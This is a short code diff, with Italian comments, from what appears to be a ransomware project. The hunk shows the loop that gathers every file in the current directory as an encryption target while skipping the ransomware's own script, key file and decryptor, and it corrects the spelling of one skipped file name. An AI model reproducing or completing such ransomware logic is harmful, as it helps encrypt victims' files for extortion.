@@ -7,7 +7,7 @@ try:
     # Prende ogni file nella directory corrente
     for file in os.listdir():
         # Salta i file se sono i seguenti:
-        if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "recive.py":
+        if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py" or file == "recieve.py":
             continue
         # Aggiunge i file target alla lista
         files.append(file)
